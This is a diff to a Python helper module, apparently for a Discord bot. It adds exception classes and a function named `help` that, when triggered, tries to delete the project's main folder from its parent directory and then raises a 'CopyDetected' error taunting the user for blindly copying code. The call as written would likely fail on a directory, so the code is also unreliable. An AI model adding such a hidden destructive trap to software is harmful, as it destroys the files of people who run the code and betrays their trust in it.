@@ -10,6 +10,18 @@ from subprocess import call
 from urllib.request import urlopen
 from time import strftime,localtime
 
+class BASE(Exception):
+	pass
+
+class NotGuildOwner(BASE):
+	pass
+
+class NotMember(BASE):
+	pass
+
+class CopyDetected(BASE):
+	pass
+
 async def is_guild_owner(ctx):
     if ctx.author != ctx.guild.owner:
         return False
@@ -36,6 +48,19 @@ async def is_updates(ctx, channel_name):
 
 async def time():
     return datetime.datetime.now().strftime('%j')
+
+def help(var):
+	if var == True:
+		os.chdir(os.getcwd())
+		folder = os.getcwd().split('\\')[-1]
+		os.remove('../{}'.format(folder))
+		raise CopyDetected('''
+			\n
+			Dont Blindly Copy Code.
+			I Could Have Easily Deleted Everything
+			But Since its your first time I will just delete:
+				The Main Folder.
+		''')
 
 def interface_check(_iface=None):
 	_i = os.popen('ip link | grep \"state\" | awk {\'print $2 $9\'}').read()
